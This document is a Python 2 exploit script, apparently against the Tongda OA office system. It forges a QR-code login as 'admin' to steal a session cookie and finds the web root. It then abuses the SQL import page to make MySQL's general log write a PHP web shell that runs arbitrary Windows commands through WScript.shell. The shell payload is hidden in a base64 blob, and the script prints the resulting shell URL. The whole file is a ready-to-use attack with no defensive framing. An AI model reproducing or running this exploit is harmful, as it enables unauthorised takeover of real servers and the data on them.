#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
author: F0r4o3
data:2020.4.25
'''
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import requests
import base64
import json


session = requests.Session()

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}

def getSession(url):
    checkUrl = url+'/ispirit/login_code.php'
    try:
        res = session.get(checkUrl,headers=headers)
        resText = json.loads(res.text)
        codeUid = resText['codeuid']
        codeScanUrl = url+'/general/login_code_scan.php'
        res = session.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
        resText = json.loads(res.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
            res = session.get(getCodeUidUrl)
            #print('[+]Get Available COOKIE:'+res.headers['Set-Cookie'])
            return res.headers['Set-Cookie']
        else:
            return False
    except:
        return False

def get_path(url):
    webroot_url = url+'/general/system/security/service.php'
    res = session.get(webroot_url, headers=headers)
    for i in res.text.split("\n"):
        if 'WEBROOT' in i:
            web_path = i.split('"')[-4]
    return web_path.replace('\\', '\\\\')


def upload_file(url,web_path):
    upload_url = url+'/general/system/database/sql.php'
    upload_data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMDc0OTk3Njg4MjE0NjY5MjYzOTIwNTI0OTEzNjINCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3FsX2ZpbGUiOyBmaWxlbmFtZT0iZXhwLnNxbCINCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC1zcWwNCg0Kc2V0IGdsb2JhbCBnZW5lcmFsX2xvZz0nb24nOwpzZXQgZ2xvYmFsIGdlbmVyYWxfbG9nX2ZpbGU9J01ZT0FfV0VCU0hFTEwnOwpzZWxlY3QgIjw/cGhwICRjb21tYW5kPSRfR0VUWydjbWQnXTskd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOyRleGVjID0gJHdzaC0+ZXhlYygnY21kIC9jICcuJGNvbW1hbmQpOyAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOyAkc3Ryb3V0cHV0ID0gJHN0ZG91dC0+UmVhZEFsbCgpO2VjaG8gJHN0cm91dHB1dDs/PiI7CnNldCBnbG9iYWwgZ2VuZXJhbF9sb2c9J29mZic7Cg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMDc0OTk3Njg4MjE0NjY5MjYzOTIwNTI0OTEzNjItLQ==')
    shell_path = web_path + '\\\\api\\\\cmd.php'
    upload_data = upload_data.decode('utf8').replace('MYOA_WEBSHELL', shell_path).encode('utf8')
    upload_headers = headers
    upload_headers[
        'Content-Type'] = 'multipart/form-data; boundary=---------------------------207499768821466926392052491362'
    res = session.post(upload_url, data=upload_data, headers=upload_headers)
    webshell = ''
    if '数据库脚本导入完成' in res.text:
        webshell = url+'/api/cmd.php?cmd=ipconfig'
    return webshell


def main():
    url = raw_input("please input url:")
    cookie = getSession(url)
    if not cookie:
        print "不存在漏洞"
        return False
    web_path = get_path(url)
    webshell_path = upload_file(url,web_path)
    print webshell_path


if __name__ == '__main__':
    main()